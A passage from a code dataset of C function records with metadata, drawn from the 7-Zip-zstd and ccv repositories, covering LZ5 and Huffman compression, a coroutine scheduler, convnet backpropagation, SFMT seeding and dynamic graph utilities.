*/\n    memset(&options, 0, sizeof(options));\n\n    cctxI.version = LZ5F_VERSION;\n    cctxI.maxBufferSize = 5 MB;   /* mess with real buffer size to prevent allocation; works because autoflush==1 & stableSrc==1 */\n\n    if (preferencesPtr!=NULL)\n        prefs = *preferencesPtr;\n    else\n        memset(&prefs, 0, sizeof(prefs));\n    if (prefs.frameInfo.contentSize != 0)\n        prefs.frameInfo.contentSize = (U64)srcSize;   /* auto-correct content size if selected (!=0) */\n\n    prefs.frameInfo.blockSizeID = LZ5F_optimalBSID(prefs.frameInfo.blockSizeID, srcSize);\n    prefs.autoFlush = 1;\n    if (srcSize <= LZ5F_getBlockSize(prefs.frameInfo.blockSizeID))\n        prefs.frameInfo.blockMode = LZ5F_blockIndependent;   /* no need for linked blocks */\n\n    options.stableSrc = 1;\n\n    if (dstMaxSize < LZ5F_compressFrameBound(srcSize, &prefs))\n        return (size_t)-LZ5F_ERROR_dstMaxSize_tooSmall;\n\n    errorCode = LZ5F_compressBegin(&cctxI, dstBuffer, dstMaxSize, &prefs);  /* write header */\n    if (LZ5F_isError(errorCode)) return errorCode;\n    dstPtr += errorCode;   /* header size */\n\n    errorCode = LZ5F_compressUpdate(&cctxI, dstPtr, dstEnd-dstPtr, srcBuffer, srcSize, &options);\n    if (LZ5F_isError(errorCode)) return errorCode;\n    dstPtr += errorCode;\n\n    errorCode = LZ5F_compressEnd(&cctxI, dstPtr, dstEnd-dstPtr, &options);   /* flush last block, and generate suffix */\n    if (LZ5F_isError(errorCode)) return errorCode;\n    dstPtr += errorCode;\n\n    LZ5F_freeStream(&cctxI);\n\n    return (dstPtr - dstStart);\n}", "path": "7-Zip-zstd/C/lz5/lz5frame.c", "commit_date": "2017-05-25 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/* trivial redirector, for common prototype */\n", "func_signal": "static int LZ5F_decompress_safe (const char* source, char* dest, int compressedSize, int maxDecompressedSize, const char* dictStart, int dictSize)", "code": "{\n    (void)dictStart; (void)dictSize;\n    return LZ5_decompress_safe (source, dest, compressedSize, maxDecompressedSize);\n}", "path": "7-Zip-zstd/C/lz5/lz5frame.c", "commit_date": "2017-05-25 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/**************************************\n*  Private functions\n**************************************/\n", "func_signal": "static size_t LZ5F_getBlockSize(unsigned blockSizeID)", "code": "{\n    static const size_t blockSizes[7] = { 64 KB, 256 KB, 1 MB, 4 MB, 16 MB, 64 MB, 256 MB };\n\n    if (blockSizeID == 0) blockSizeID = LZ5F_BLOCKSIZEID_DEFAULT;\n    blockSizeID -= 1;\n    if (blockSizeID >= 7) return (size_t)-LZ5F_ERROR_maxBlockSize_invalid;\n\n  //  printf(\"LZ5F_getBlockSize %d %d\\n\", blockSizeID+1, (int)blockSizes[blockSizeID]);\n    return blockSizes[blockSizeID];\n}", "path": "7-Zip-zstd/C/lz5/lz5frame.c", "commit_date": "2017-05-25 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/* HUF_compress_internal() :\n * `workSpace` must a table of at least HUF_WORKSPACE_SIZE_U32 unsigned */\n", "func_signal": "static size_t\nHUF_compress_internal (void* dst, size_t dstSize,\n                 const void* src, size_t srcSize,\n                       unsigned maxSymbolValue, unsigned huffLog,\n                       HUF_nbStreams_e nbStreams,\n                       void* workSpace, size_t wkspSize,\n                       HUF_CElt* oldHufTable, HUF_repeat* repeat, int preferRepeat,\n                 const int bmi2)", "code": "{\n    HUF_compress_tables_t* const table = (HUF_compress_tables_t*)workSpace;\n    BYTE* const ostart = (BYTE*)dst;\n    BYTE* const oend = ostart + dstSize;\n    BYTE* op = ostart;\n\n    HUF_STATIC_ASSERT(sizeof(*table) <= HUF_WORKSPACE_SIZE);\n\n    /* checks & inits */\n    if (((size_t)workSpace & 3) != 0) return ERROR(GENERIC);  /* must be aligned on 4-bytes boundaries */\n    if (wkspSize < HUF_WORKSPACE_SIZE) return ERROR(workSpace_tooSmall);\n    if (!srcSize) return 0;  /* Uncompressed */\n    if (!dstSize) return 0;  /* cannot fit anything within dst budget */\n    if (srcSize > HUF_BLOCKSIZE_MAX) return ERROR(srcSize_wrong);   /* current block size limit */\n    if (huffLog > HUF_TABLELOG_MAX) return ERROR(tableLog_tooLarge);\n    if (maxSymbolValue > HUF_SYMBOLVALUE_MAX) return ERROR(maxSymbolValue_tooLarge);\n    if (!maxSymbolValue) maxSymbolValue = HUF_SYMBOLVALUE_MAX;\n    if (!huffLog) huffLog = HUF_TABLELOG_DEFAULT;\n\n    /* Heuristic : If old table is valid, use it for small inputs */\n    if (preferRepeat && repeat && *repeat == HUF_repeat_valid) {\n        return HUF_compressCTable_internal(ostart, op, oend,\n                                           src, srcSize,\n                                           nbStreams, oldHufTable, bmi2);\n    }\n\n    /* Scan input and build symbol stats */\n    {   CHECK_V_F(largest, HIST_count_wksp (table->count, &maxSymbolValue, (const BYTE*)src, srcSize, workSpace, wkspSize) );\n        if (largest == srcSize) { *ostart = ((const BYTE*)src)[0]; return 1; }   /* single symbol, rle */\n        if (largest <= (srcSize >> 7)+4) return 0;   /* heuristic : probably not compressible enough */\n    }\n\n    /* Check validity of previous table */\n    if ( repeat\n      && *repeat == HUF_repeat_check\n      && !HUF_validateCTable(oldHufTable, table->count, maxSymbolValue)) {\n        *repeat = HUF_repeat_none;\n    }\n    /* Heuristic : use existing table for small inputs */\n    if (preferRepeat && repeat && *repeat != HUF_repeat_none) {\n        return HUF_compressCTable_internal(ostart, op, oend,\n                                           src, srcSize,\n                                           nbStreams, oldHufTable, bmi2);\n    }\n\n    /* Build Huffman Tree */\n    huffLog = HUF_optimalTableLog(huffLog, srcSize, maxSymbolValue);\n    {   size_t const maxBits = HUF_buildCTable_wksp(table->CTable, table->count,\n                                            maxSymbolValue, huffLog,\n                                            &table->buildCTable_wksp, sizeof(table->buildCTable_wksp));\n        CHECK_F(maxBits);\n        huffLog = (U32)maxBits;\n        /* Zero unused symbols in CTable, so we can check it for validity */\n        ZSTD_memset(table->CTable + (maxSymbolValue + 1), 0,\n               sizeof(table->CTable) - ((maxSymbolValue + 1) * sizeof(HUF_CElt)));\n    }\n\n    /* Write table description header */\n    {   CHECK_V_F(hSize, HUF_writeCTable (op, dstSize, table->CTable, maxSymbolValue, huffLog) );\n        /* Check if using previous huffman table is beneficial */\n        if (repeat && *repeat != HUF_repeat_none) {\n            size_t const oldSize = HUF_estimateCompressedSize(oldHufTable, table->count, maxSymbolValue);\n            size_t const newSize = HUF_estimateCompressedSize(table->CTable, table->count, maxSymbolValue);\n            if (oldSize <= hSize + newSize || hSize + 12 >= srcSize) {\n                return HUF_compressCTable_internal(ostart, op, oend,\n                                                   src, srcSize,\n                                                   nbStreams, oldHufTable, bmi2);\n        }   }\n\n        /* Use the new huffman table */\n        if (hSize + 12ul >= srcSize) { return 0; }\n        op += hSize;\n        if (repeat) { *repeat = HUF_repeat_none; }\n        if (oldHufTable)\n            ZSTD_memcpy(oldHufTable, table->CTable, sizeof(table->CTable));  /* Save new table */\n    }\n    return HUF_compressCTable_internal(ostart, op, oend,\n                                       src, srcSize,\n                                       nbStreams, table->CTable, bmi2);\n}", "path": "7-Zip-zstd/C/zstd/huf_compress.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "/* unoptimized version; solves endianess & alignment issues */\n", "func_signal": "static U32 LZ5F_readLE32 (const BYTE* srcPtr)", "code": "{\n    U32 value32 = srcPtr[0];\n    value32 += (srcPtr[1]<<8);\n    value32 += (srcPtr[2]<<16);\n    value32 += ((U32)srcPtr[3])<<24;\n    return value32;\n}", "path": "7-Zip-zstd/C/lz5/lz5frame.c", "commit_date": "2017-05-25 00:00:00", "repo_name": "mcmilk/7-Zip-zstd", "stars": 4492, "license": "other", "language": "c", "size": 12061}
{"docstring": "// MARK - Level-3.5 API\n", "func_signal": "ccv_nnc_graph_exec_symbol_t ccv_nnc_symbolic_graph_while(ccv_nnc_symbolic_graph_t* const graph, const uint32_t cmd, ccv_nnc_symbolic_graph_t* const while_graph, const char* const name)", "code": "{\n\tassert(cmd == CCV_NNC_GRAPH_FORWARD || cmd == CCV_NNC_GRAPH_BACKWARD);\n\tassert(while_graph->p == 0);\n\tassert(while_graph->p_idx == 0);\n\t// Added one more symbol.\n\tccv_nnc_graph_exec_symbol_t symbol = ccv_nnc_graph_exec_symbol_new(graph, ccv_nnc_cmd(cmd, 0, CMD_GENERIC(), 0), 0, 0, 0, 0, name);\n\t// Assigning graph_ref to it.\n\tif (!graph->sub_graphs)\n\t\tgraph->sub_graphs = ccv_array_new(sizeof(ccv_nnc_symbolic_graph_t*), 1, 0);\n\tccv_array_push(graph->sub_graphs, &while_graph);\n\tccv_nnc_graph_exec_symbol_info_t* symbol_info = (ccv_nnc_graph_exec_symbol_info_t*)ccv_array_get(graph->exec_symbol_info, symbol.d);\n\tsymbol_info->flags |= CCV_NNC_GRAPH_EXEC_P_WHILE;\n\tsymbol_info->graph_ref_size = 1;\n\t// Note the extra allocation (the ccv_array_t only holds a pointer to ccv_nnc_symbolic_graph_t*).\n\t// In this way, we can get the while graph and don't have to worry about it will be an invalid pointer once\n\t// the array expands (another while graph allocated).\n\tCCV_NNC_GRAPH_REF(symbol_info)[0] = graph->sub_graphs->rnum;\n\twhile_graph->p_idx = graph->sub_graphs->rnum;\n\twhile_graph->exec_idx = symbol.d + 1;\n\twhile_graph->p = graph;\n\treturn symbol;\n}", "path": "ccv/lib/nnc/ccv_nnc_symbolic_graph_while.c", "commit_date": "2020-09-19 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "/**\n * This function returns the minimum size of array used for \\b\n * fill_array32() function.\n * @param sfmt SFMT internal state\n * @return minimum size of array used for fill_array32() function.\n */\n", "func_signal": "int sfmt_get_min_array_size32(sfmt_t * sfmt)", "code": "{\n    UNUSED_VARIABLE(sfmt);\n    return SFMT_N32;\n}", "path": "ccv/lib/3rdparty/sfmt/SFMT.c", "commit_date": "2019-12-23 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "// find the layer for scanning (it is the last convolutional layer)\n", "func_signal": "static int _ccv_convnet_find_scan(ccv_convnet_t* convnet)", "code": "{\n\tint i;\n\tccv_convnet_layer_t* layers = convnet->layers;\n\tfor (i = convnet->count - 1; i >= 0; i--)\n\t\tif (layers[i].type == CCV_CONVNET_CONVOLUTIONAL)\n\t\t\treturn i;\n\treturn -1;\n}", "path": "ccv/lib/ccv_convnet.c", "commit_date": "2016-03-29 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "// Second will invoke this blocking variant to schedule task on a newly created thread.\n", "func_signal": "static void* _co_main(void* userdata)", "code": "{\n\tco_scheduler_t* const scheduler = (co_scheduler_t*)userdata;\n\tpthread_mutex_lock(&scheduler->mutex);\n\t// By definition, the last task cannot co_free itself. And because this\n\t// scheduler is asynchronous, we cannot free it somewhere else. That\n\t// left us with the only choice to free the task at the very end when we\n\t// are going to put the scheduler to sleep again.\n\tfor (;;)\n\t{\n\t\tif (scheduler->head == 0 && scheduler->stream_await_count == 0)\n\t\t{\n\t\t\tscheduler->active = 0;\n\t\t\tpthread_cond_broadcast(&scheduler->notify);\n\t\t\tpthread_mutex_unlock(&scheduler->mutex);\n\t\t\tbreak;\n\t\t}\n\t\tif (scheduler->head == 0)\n\t\t{\n\t\t\tpthread_cond_wait(&scheduler->wait, &scheduler->mutex);\n\t\t\tpthread_mutex_unlock(&scheduler->mutex);\n\t\t}\n\t\tco_routine_t* task = scheduler->head;\n\t\t_co_delete_task(scheduler, task);\n\t\tpthread_mutex_unlock(&scheduler->mutex);\n\t\twhile (task) {\n\t\t\tconst co_state_t state = task->fn(task, task + 1);\n\t\t\ttask->line = state.line;\n\t\t\ttask->done = state.done;\n\t\t\tif (task->callee)\n\t\t\t\ttask = task->callee;\n\t\t\telse {\n\t\t\t\tco_routine_t* const prev_task = task;\n\t\t\t\ttask = task->caller;\n\t\t\t\tprev_task->caller = 0;\n\t\t\t\tif (prev_task->done)\n\t\t\t\t{\n\t\t\t\t\tco_routine_t* const notify_any = _co_done(prev_task);\n\t\t\t\t\tif (prev_task->root) // Free the task scheduled from co_schedule.\n\t\t\t\t\t\tco_free(prev_task);\n\t\t\t\t\tif (notify_any)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (!task)\n\t\t\t\t\t\t\ttask = notify_any;\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\tpthread_mutex_lock(&scheduler->mutex);\n\t\t\t\t\t\t\t_co_prepend_task(scheduler, notify_any);\n\t\t\t\t\t\t\tpthread_mutex_unlock(&scheduler->mutex);\n\t\t\t\t\t\t\t// Since we have task, we will resume the inner loop.\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tpthread_mutex_lock(&scheduler->mutex);\n\t}\n\treturn 0;\n}", "path": "ccv/lib/nnc/co.c", "commit_date": "2019-12-07 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "// Return the tensor variable that is old (the provided tensor variable will have a new setting).\n", "func_signal": "ccv_nnc_tensor_variable_t ccv_nnc_tensor_variable_exchange_new(ccv_nnc_dynamic_graph_t* const graph, ccv_nnc_tensor_variable_t tensor_variable)", "code": "{\n\tstruct ccv_nnc_tensor_variable_s x = *tensor_variable;\n\tccv_nnc_tensor_variable_t new_variable;\n\t// Need to handle alias.\n\tif (x.alias_index_ref)\n\t\tnew_variable = ccv_nnc_tensor_variable_alias_new(graph, *(ccv_nnc_tensor_variable_t*)ccv_array_get(graph->vars, x.alias_index_ref - 1), x.ofs, x.inc, x.info);\n\telse\n\t\tnew_variable = ccv_nnc_tensor_variable_new(graph, x.info);\n\t*tensor_variable = *new_variable;\n\t*new_variable = x;\n\t// The index should be the same though.\n\tconst int index = new_variable->index;\n\tnew_variable->index = tensor_variable->index;\n\tif (new_variable->symbol.d != CCV_NNC_NO_TENSOR_SYMBOL)\n\t{\n\t\tccv_nnc_tensor_variable_graph_bind_t* const bind = (ccv_nnc_tensor_variable_graph_bind_t*)ccv_array_get(graph->binds, new_variable->symbol.d);\n\t\tbind->index = new_variable->index;\n\t}\n\ttensor_variable->index = index;\n\treturn new_variable;\n}", "path": "ccv/lib/nnc/ccv_nnc_dynamic_graph.c", "commit_date": "2020-12-21 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "/* this file is for all failed cases (a.k.a. bugs) that before 0.1 version */\n", "func_signal": "TEST_CASE(\"ccv_filter cannot cover full range when the source is small enough\")", "code": "{\n\tccv_dense_matrix_t* x = ccv_dense_matrix_new(20, 14, CCV_32F | CCV_C1, 0, 0);\n\tccv_dense_matrix_t* y = ccv_dense_matrix_new(15, 5, CCV_32F | CCV_C1, 0, 0);\n\tint i;\n\tfor (i = 0; i < 15 * 5; i++)\n\t\ty->data.f32[i] = 1;\n\tfor (i = 0; i < 20 * 14; i++)\n\t\tx->data.f32[i] = 1;\n\tccv_dense_matrix_t* d = ccv_dense_matrix_new(20, 14, CCV_32F | CCV_C1, 0, 0);\n\tfor (i = 0; i < 20 * 14; i++)\n\t\td->data.f32[i] = sqrtf(-1.0f);\n\tccv_filter(x, y, &d, 0, CCV_NO_PADDING);\n\tREQUIRE(!ccv_any_nan(d), \"filter result shouldn't contain any nan value\");\n\tccv_matrix_free(d);\n\tccv_matrix_free(y);\n\tccv_matrix_free(x);\n}", "path": "ccv/test/regression/defects.l0.1.tests.c", "commit_date": "2012-05-12 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "// First will invoke this non-blocking variant to schedule task.\n", "func_signal": "static void _co_try(co_scheduler_t* const scheduler)", "code": "{\n\tpthread_mutex_lock(&scheduler->mutex);\n\tif (scheduler->active)\n\t{\n\t\tpthread_mutex_unlock(&scheduler->mutex);\n\t\treturn;\n\t}\n\tscheduler->active = 1;\n\tfor (;;)\n\t{\n\t\tif (scheduler->head == 0 && scheduler->stream_await_count == 0)\n\t\t{\n\t\t\tscheduler->active = 0;\n\t\t\tpthread_mutex_unlock(&scheduler->mutex);\n\t\t\tbreak;\n\t\t}\n\t\tif (scheduler->head == 0)\n\t\t{\n\t\t\t// Launch a thread to continue the execution.\n\t\t\tpthread_create(&scheduler->thread, 0, _co_main, scheduler);\n\t\t\tpthread_mutex_unlock(&scheduler->mutex);\n\t\t\tbreak;\n\t\t}\n\t\tco_routine_t* task = scheduler->head;\n\t\t_co_delete_task(scheduler, task);\n\t\tpthread_mutex_unlock(&scheduler->mutex);\n\t\twhile (task) {\n\t\t\tconst co_state_t state = task->fn(task, task + 1);\n\t\t\ttask->line = state.line;\n\t\t\ttask->done = state.done;\n\t\t\tif (task->callee)\n\t\t\t\ttask = task->callee;\n\t\t\telse {\n\t\t\t\tco_routine_t* const prev_task = task;\n\t\t\t\ttask = task->caller;\n\t\t\t\tprev_task->caller = 0;\n\t\t\t\tif (prev_task->done)\n\t\t\t\t{\n\t\t\t\t\tco_routine_t* const notify_any = _co_done(prev_task);\n\t\t\t\t\tif (prev_task->root) // Free the task scheduled from co_schedule.\n\t\t\t\t\t\tco_free(prev_task);\n\t\t\t\t\tif (notify_any)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (!task)\n\t\t\t\t\t\t\ttask = notify_any;\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\tpthread_mutex_lock(&scheduler->mutex);\n\t\t\t\t\t\t\t_co_prepend_task(scheduler, notify_any);\n\t\t\t\t\t\t\tpthread_mutex_unlock(&scheduler->mutex);\n\t\t\t\t\t\t\t// Since we have task, we will resume the inner loop.\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tpthread_mutex_lock(&scheduler->mutex);\n\t}\n}", "path": "ccv/lib/nnc/co.c", "commit_date": "2019-12-07 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "// compute back propagated gradient & weight update delta\n", "func_signal": "static void _ccv_convnet_convolutional_backward_propagate(ccv_convnet_layer_t* layer, ccv_dense_matrix_t* a, ccv_dense_matrix_t* n, ccv_dense_matrix_t* m, ccv_dense_matrix_t** b, ccv_convnet_layer_t* update_params)", "code": "{\n\t// a is the input gradient (for back prop).\n\t// x is the input (for forward prop), b is the output gradient (gradient, or known as propagated error)\n\t// note that y (the output from forward prop) is not included because the full connect net is simple enough that we don't need it\n\tint rows, cols, partition;\n\tccv_convnet_make_output(layer, layer->input.matrix.rows, layer->input.matrix.cols, &rows, &cols, &partition);\n\tint ch = layer->net.convolutional.channels;\n\tint count = layer->net.convolutional.count;\n\tint strides = layer->net.convolutional.strides;\n\tint border = layer->net.convolutional.border;\n\tint kernel_rows = layer->net.convolutional.rows;\n\tint kernel_cols = layer->net.convolutional.cols;\n\tassert(a->rows == rows);\n\tassert(a->cols == cols);\n\tassert(CCV_GET_CHANNEL(a->type) == count);\n\tint a_rows = a->rows, a_cols = a->cols, a_ch = CCV_GET_CHANNEL(a->type);\n\ta->rows = rows, a->cols = cols, a->type = (a->type - a_ch) | count;\n\tassert(CCV_GET_CHANNEL(m->type) == ch);\n\tassert(CCV_GET_DATA_TYPE(m->type) == CCV_32F);\n\tint count_per_partition = count / partition;\n\tint ch_per_partition = ch / partition;\n\t// update weight gradient\n\tparallel_for(k, count) {\n\t\tint i, j, x, y, c;\n\t\tint p = k / count_per_partition;\n\t\tfloat* mp = m->data.f32 + p * ch_per_partition;\n\t\tfloat* ap = a->data.f32 + k;\n\t\tfloat* np = n->data.f32 + k;\n\t\tfloat* update_w = update_params->w + k * kernel_rows * kernel_cols * ch_per_partition;\n\t\tfloat bias = 0;\n\t\tfor (i = 0; i < rows; i++)\n\t\t{\n\t\t\tint comy = ccv_max(i * strides - border, 0) - (i * strides - border);\n\t\t\tint maxy = kernel_rows - comy - (i * strides + kernel_rows - ccv_min(m->rows + border, i * strides + kernel_rows));\n\t\t\tcomy *= ch_per_partition * kernel_cols;\n\t\t\tfor (j = 0; j < cols; j++)\n\t\t\t{\n\t\t\t\tif (np[j * count] > 0)\n\t\t\t\t{ /* when np is bigger than 0, relu continues to update the weight, otherwise it stops */\n\t\t\t\t\tfloat v = ap[j * count];\n\t\t\t\t\tbias += v;\n\t\t\t\t\tint comx = ccv_max(j * strides - border, 0) - (j * strides - border);\n\t\t\t\t\tint maxx = kernel_cols - comx - (j * strides + kernel_cols - ccv_min(m->cols + border, j * strides + kernel_cols));\n\t\t\t\t\tfloat* w = update_w + comx * ch_per_partition + comy;\n\t\t\t\t\tfloat* mpz = mp + ccv_max(j * strides - border, 0) * ch;\n\t\t\t\t\t/* when we have border, we simply do zero padding */\n\t\t\t\t\tfor (y = 0; y < maxy; y++)\n\t\t\t\t\t{\n\t\t\t\t\t\tfor (x = 0; x < maxx; x++)\n\t\t\t\t\t\t\tfor (c = 0; c < ch_per_partition; c++)\n\t\t\t\t\t\t\t\tw[x * ch_per_partition + c] += v * mpz[x * ch + c];\n\t\t\t\t\t\tw += kernel_cols * ch_per_partition;\n\t\t\t\t\t\tmpz += m->cols * ch;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tap += a->cols * count;\n\t\t\tnp += n->cols * count;\n\t\t\tmp += m->cols * ch * (ccv_max((i + 1) * strides - border, 0) - ccv_max(i * strides - border, 0));\n\t\t}\n\t\tupdate_params->bias[k] += bias;\n\t} parallel_endfor\n\tif (b)\n\t{\n\t\tccv_dense_matrix_t* db = *b = ccv_dense_matrix_renew(*b, m->rows, m->cols, CCV_32F | CCV_GET_CHANNEL(m->type), CCV_32F | CCV_GET_CHANNEL(m->type), 0);\n\t\t// clear it up before propagate result\n\t\tccv_zero(db);\n\t\tint k;\n\t\tfor (k = 0; k < count; k++)\n\t\t{\n\t\t\tint i, j, x, y, c;\n\t\t\tint p = k / count_per_partition;\n\t\t\tfloat* bp = db->data.f32 + p * ch_per_partition;\n\t\t\tfloat* ap = a->data.f32 + k;\n\t\t\tfloat* np = n->data.f32 + k;\n\t\t\tfloat* layer_w = layer->w + k * kernel_rows * kernel_cols * ch_per_partition;\n\t\t\tfor (i = 0; i < rows; i++)\n\t\t\t{\n\t\t\t\tint comy = ccv_max(i * strides - border, 0) - (i * strides - border);\n\t\t\t\tint maxy = kernel_rows - comy - (i * strides + kernel_rows - ccv_min(db->rows + border, i * strides + kernel_rows));\n\t\t\t\tcomy *= ch_per_partition * kernel_cols;\n\t\t\t\tfor (j = 0; j < cols; j++)\n\t\t\t\t{\n\t\t\t\t\tif (np[j * count] > 0)\n\t\t\t\t\t{ /* when np is bigger than 0, relu continues to update the weight, otherwise it stops */\n\t\t\t\t\t\tfloat v = ap[j * count];\n\t\t\t\t\t\tint comx = ccv_max(j * strides - border, 0) - (j * strides - border);\n\t\t\t\t\t\tint maxx = kernel_cols - comx - (j * strides + kernel_cols - ccv_min(db->cols + border, j * strides + kernel_cols));\n\t\t\t\t\t\tfloat* w = layer_w + comx * ch_per_partition + comy;\n\t\t\t\t\t\tfloat* bpz = bp + ccv_max(j * strides - border, 0) * ch;\n\t\t\t\t\t\t/* when we have border, we simply do zero padding */\n\t\t\t\t\t\tfor (y = 0; y < maxy; y++)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tfor (x = 0; x < maxx; x++)\n\t\t\t\t\t\t\t\tfor (c = 0; c < ch_per_partition; c++)\n\t\t\t\t\t\t\t\t\tbpz[x * ch + c] += v * w[x * ch_per_partition + c];\n\t\t\t\t\t\t\tw += kernel_cols * ch_per_partition;\n\t\t\t\t\t\t\tbpz += db->cols * ch;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tap += a->cols * count;\n\t\t\t\tnp += n->cols * count;\n\t\t\t\tbp += db->cols * ch * (ccv_max((i + 1) * strides - border, 0) - ccv_max(i * strides - border, 0));\n\t\t\t}\n\t\t}\n\t}\n\ta->rows = a_rows, a->cols = a_cols, a->type = (a->type - CCV_GET_CHANNEL(a->type)) | a_ch;\n}", "path": "ccv/lib/ccv_convnet.c", "commit_date": "2016-03-29 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "// MARK - Level-4 API\n", "func_signal": "ccv_nnc_dynamic_graph_t* ccv_nnc_dynamic_graph_new(void)", "code": "{\n\tccv_nnc_dynamic_graph_t* graph = ccmalloc(sizeof(ccv_nnc_dynamic_graph_t));\n\tgraph->no_grad = 0;\n\tgraph->reuse_var = -1;\n\tgraph->mp_hdr = -1;\n\tgraph->vars = ccv_array_new(sizeof(ccv_nnc_tensor_variable_t), 1, 0);\n\tgraph->binds = ccv_array_new(sizeof(ccv_nnc_tensor_variable_graph_bind_t), 1, 0);\n\tgraph->tape = ccv_nnc_symbolic_graph_new();\n\tgraph->freed = kh_init(dy_str);\n\tgraph->allocd = kh_init(dy_alloc);\n\t// These may not be used as frequent, init as needed.\n\tgraph->stateful_execs = 0;\n\tgraph->reuse_stateful_exec = -1;\n\tgraph->synced_streams = 0;\n\tgraph->signal_container = 0;\n\tgraph->ws = 0;\n\treturn graph;\n}", "path": "ccv/lib/nnc/ccv_nnc_dynamic_graph.c", "commit_date": "2020-12-21 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "/**\n * This function initializes the internal state array,\n * with an array of 32-bit integers used as the seeds\n * @param sfmt SFMT internal state\n * @param init_key the array of 32-bit integers, used as a seed.\n * @param key_length the length of init_key.\n */\n", "func_signal": "void sfmt_init_by_array(sfmt_t * sfmt, uint32_t *init_key, int key_length)", "code": "{\n    int i, j, count;\n    uint32_t r;\n    int lag;\n    int mid;\n    int size = SFMT_N * 4;\n    uint32_t *psfmt32 = &sfmt->state[0].u[0];\n\n    if (size >= 623) {\n\tlag = 11;\n    } else if (size >= 68) {\n\tlag = 7;\n    } else if (size >= 39) {\n\tlag = 5;\n    } else {\n\tlag = 3;\n    }\n    mid = (size - lag) / 2;\n\n    memset(sfmt, 0x8b, sizeof(sfmt_t));\n    if (key_length + 1 > SFMT_N32) {\n\tcount = key_length + 1;\n    } else {\n\tcount = SFMT_N32;\n    }\n    r = func1(psfmt32[idxof(0)] ^ psfmt32[idxof(mid)]\n\t      ^ psfmt32[idxof(SFMT_N32 - 1)]);\n    psfmt32[idxof(mid)] += r;\n    r += key_length;\n    psfmt32[idxof(mid + lag)] += r;\n    psfmt32[idxof(0)] = r;\n\n    count--;\n    for (i = 1, j = 0; (j < count) && (j < key_length); j++) {\n\tr = func1(psfmt32[idxof(i)] ^ psfmt32[idxof((i + mid) % SFMT_N32)]\n\t\t  ^ psfmt32[idxof((i + SFMT_N32 - 1) % SFMT_N32)]);\n\tpsfmt32[idxof((i + mid) % SFMT_N32)] += r;\n\tr += init_key[j] + i;\n\tpsfmt32[idxof((i + mid + lag) % SFMT_N32)] += r;\n\tpsfmt32[idxof(i)] = r;\n\ti = (i + 1) % SFMT_N32;\n    }\n    for (; j < count; j++) {\n\tr = func1(psfmt32[idxof(i)] ^ psfmt32[idxof((i + mid) % SFMT_N32)]\n\t\t  ^ psfmt32[idxof((i + SFMT_N32 - 1) % SFMT_N32)]);\n\tpsfmt32[idxof((i + mid) % SFMT_N32)] += r;\n\tr += i;\n\tpsfmt32[idxof((i + mid + lag) % SFMT_N32)] += r;\n\tpsfmt32[idxof(i)] = r;\n\ti = (i + 1) % SFMT_N32;\n    }\n    for (j = 0; j < SFMT_N32; j++) {\n\tr = func2(psfmt32[idxof(i)] + psfmt32[idxof((i + mid) % SFMT_N32)]\n\t\t  + psfmt32[idxof((i + SFMT_N32 - 1) % SFMT_N32)]);\n\tpsfmt32[idxof((i + mid) % SFMT_N32)] ^= r;\n\tr -= i;\n\tpsfmt32[idxof((i + mid + lag) % SFMT_N32)] ^= r;\n\tpsfmt32[idxof(i)] = r;\n\ti = (i + 1) % SFMT_N32;\n    }\n\n    sfmt->idx = SFMT_N32;\n    period_certification(sfmt);\n}", "path": "ccv/lib/3rdparty/sfmt/SFMT.c", "commit_date": "2019-12-23 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "// MARK - Level-4.5 API\n", "func_signal": "void ccv_nnc_dynamic_graph_apply_gradients(ccv_nnc_dynamic_graph_t* const dynamic_graph, const ccv_nnc_cmd_t minimizer, const ccv_nnc_tensor_variable_t* const gradients, const int gradient_size, ccv_nnc_tensor_variable_t* const parameters, const int parameter_size, ccv_nnc_tensor_variable_t* const saved_aux, const int parallel, ccv_nnc_stream_context_t* const stream_context)", "code": "{\n\tassert(gradient_size == parameter_size);\n\tassert(!dynamic_graph->no_grad);\n\t// Call apply gradients to stateful execs first.\n\tint i, j;\n\tif (dynamic_graph->stateful_execs)\n\t{\n\t\tfor (i = 0; i < dynamic_graph->stateful_execs->rnum; i++)\n\t\t{\n\t\t\tccv_nnc_stateful_exec_t* const stateful_exec = *(ccv_nnc_stateful_exec_t**)ccv_array_get(dynamic_graph->stateful_execs, i);\n\t\t\t// We only apply gradients when backward round has done.\n\t\t\tif 